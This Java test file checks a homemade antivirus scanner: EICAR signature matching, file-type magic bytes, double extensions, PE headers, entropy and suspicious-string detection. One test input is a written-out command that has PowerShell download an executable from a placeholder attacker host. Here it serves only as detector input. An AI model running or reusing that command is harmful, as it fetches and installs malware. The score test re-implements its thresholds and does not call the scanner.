package antivirus;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import antivirus.scanner.*;

public class HeapSecTest {

    private static int passed = 0;
    private static int failed = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("╔════════════════════════════════════════╗");
        System.out.println("║     HeapSec Antivirus Tests         ║");
        System.out.println("╚════════════════════════════════════════╝\n");

        testEICARDetection();
        testMagicBytesWhitelist();
        testScoreClassification();
        testExtensionChecker();
        testPEAnalyzer();
        testEntropy();
        testBoyerMoore();

        System.out.println("\n╔════════════════════════════════════════╗");
        System.out.println("║           RESUMO                  ║");
        System.out.println("╠════════════════════════════════════════╣");
        System.out.println("║ Passed: " + passed + "                          ║");
        System.out.println("║ Failed: " + failed + "                          ║");
        System.out.println("╚════════════════════════════════════════╝");

        if (failed > 0) {
            System.exit(1);
        }
    }

    static void testEICARDetection() {
        System.out.println("--- Test: EICAR Detection ---");
        try {
            String eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
            byte[] data = eicar.getBytes();

            YaraScanner yara = new YaraScanner();
            List<String> matches = yara.scan(data);
            int score = yara.getTotalScore(data, 0);

            if (score >= 100 && matches.stream().anyMatch(m -> m.toLowerCase().contains("eicar"))) {
                System.out.println("✓ PASS: EICAR detected (score=" + score + ")");
                passed++;
            } else {
                System.out.println("✗ FAIL: EICAR not detected (score=" + score + ")");
                failed++;
            }
        } catch (Exception e) {
            System.out.println("✗ FAIL: " + e.getMessage());
            failed++;
        }
    }

    static void testMagicBytesWhitelist() {
        System.out.println("--- Test: Magic Bytes Whitelist ---");
        try {
            EntropyAnalyzer ea = new EntropyAnalyzer();

            testMagicBytes(ea, new byte[]{(byte)0xFF, (byte)0xFB, (byte)0x90}, "MP3", true);
            testMagicBytes(ea, new byte[]{(byte)0xFF, (byte)0xD8, (byte)0xFF, (byte)0xD9}, "JPEG", true);
            testMagicBytes(ea, new byte[]{(byte)0x50, (byte)0x4B, (byte)0x03, (byte)0x04}, "ZIP", true);
            testMagicBytes(ea, new byte[]{(byte)0x89, (byte)0x50, (byte)0x4E, (byte)0x47}, "PNG", true);
            testMagicBytes(ea, new byte[]{(byte)0x4D, (byte)0x5A, (byte)0x00}, "EXE", false);

        } catch (Exception e) {
            System.out.println("✗ FAIL: " + e.getMessage());
            failed++;
        }
    }

    static void testMagicBytes(EntropyAnalyzer ea, byte[] data, String name, boolean expected) {
        boolean result = ea.isKnownSafeMagic(data);
        if (result == expected) {
            System.out.println("✓ PASS: " + name + " = " + result);
            passed++;
        } else {
            System.out.println("✗ FAIL: " + name + " expected " + expected + " got " + result);
            failed++;
        }
    }

    static void testScoreClassification() {
        System.out.println("--- Test: Score Classification ---");
        AntivirusScanner scanner = new AntivirusScanner();

        testScore(0, "SEGURO");
        testScore(19, "SEGURO");
        testScore(20, "BAIXO");
        testScore(54, "BAIXO");
        testScore(55, "MEDIO");
        testScore(84, "MEDIO");
        testScore(85, "ALTO");
        testScore(119, "ALTO");
        testScore(120, "CRITICO");
    }

    static void testScore(int score, String expected) {
        String level;
        if (score >= 120) level = "CRITICO";
        else if (score >= 85) level = "ALTO";
        else if (score >= 55) level = "MEDIO";
        else if (score >= 20) level = "BAIXO";
        else level = "SEGURO";

        if (level.equals(expected)) {
            System.out.println("✓ PASS: score " + score + " = " + level);
            passed++;
        } else {
            System.out.println("✗ FAIL: score " + score + " expected " + expected + " got " + level);
            failed++;
        }
    }

    static void testExtensionChecker() {
        System.out.println("--- Test: Extension Checker ---");
        ExtensionChecker ec = new ExtensionChecker();

        testExt(ec, "documento.pdf.exe", true);
        testExt(ec, "foto.jpg.exe", true);
        testExt(ec, "musica.mp3", false);
        testExt(ec, "arquivo.exe", false);
        testExt(ec, "documento.pdf", false);
    }

    static void testExt(ExtensionChecker ec, String filename, boolean expected) {
        boolean result = ec.check(filename);
        if (result == expected) {
            System.out.println("✓ PASS: " + filename + " = " + result);
            passed++;
        } else {
            System.out.println("✗ FAIL: " + filename + " expected " + expected + " got " + result);
            failed++;
        }
    }

    static void testPEAnalyzer() {
        System.out.println("--- Test: PE Analyzer ---");
        PEAnalyzer pe = new PEAnalyzer();

        byte[] validPE = new byte[512];
        validPE[0] = (byte)0x4D;
        validPE[1] = (byte)0x5A;
        validPE[60] = 64;
        validPE[61] = 0;
        validPE[62] = 0;
        validPE[63] = 0;
        validPE[64] = 0x50;
        validPE[65] = 0x45;
        validPE[66] = 0x00;
        validPE[67] = 0x00;

        PEAnalysis valid = pe.analyze(validPE);
        if (valid.isValidPE()) {
            System.out.println("✓ PASS: Valid PE detected");
            passed++;
        } else {
            System.out.println("✗ FAIL: Valid PE not detected");
            failed++;
        }

        byte[] notPE = "not a PE file".getBytes();
        PEAnalysis invalid = pe.analyze(notPE);
        if (!invalid.isValidPE()) {
            System.out.println("✓ PASS: Non-PE rejected");
            passed++;
        } else {
            System.out.println("✗ FAIL: Non-PE incorrectly accepted");
            failed++;
        }
    }

    static void testEntropy() {
        System.out.println("--- Test: Entropy ---");
        EntropyAnalyzer ea = new EntropyAnalyzer();

        byte[] lowEntropy = "AAAAAAAAAAAAAAAAB".getBytes();
        double low = ea.calculateEntropy(lowEntropy);
        if (low < 2.0) {
            System.out.println("✓ PASS: Low entropy = " + low);
            passed++;
        } else {
            System.out.println("✗ FAIL: Low entropy too high = " + low);
            failed++;
        }

        byte[] random = new byte[256];
        for (int i = 0; i < 256; i++) random[i] = (byte)i;
        double high = ea.calculateEntropy(random);
        if (high > 7.5) {
            System.out.println("✓ PASS: High entropy = " + high);
            passed++;
        } else {
            System.out.println("✗ FAIL: High entropy too low = " + high);
            failed++;
        }
    }

    static void testBoyerMoore() {
        System.out.println("--- Test: Boyer-Moore/Aho-Corasick ---");
        BoyerMooreStringDetector det = new BoyerMooreStringDetector();

        String test = "cmd.exe /c powershell -nop wget http://evil.com/malware.exe";
        byte[] data = test.getBytes();

        List<String> susp = BoyerMooreStringDetector.detectSuspicious(data);
        if (!susp.isEmpty()) {
            System.out.println("✓ PASS: Detected: " + susp);
            passed++;
        } else {
            System.out.println("✗ FAIL: Suspicious not detected");
            failed++;
        }

        List<String> pwd = BoyerMooreStringDetector.detectPasswordStealer(data);
        if (pwd.isEmpty()) {
            System.out.println("✓ PASS: No password stealer (expected)");
            passed++;
        } else {
            System.out.println("✗ FAIL: False positive: " + pwd);
            failed++;
        }
    }
}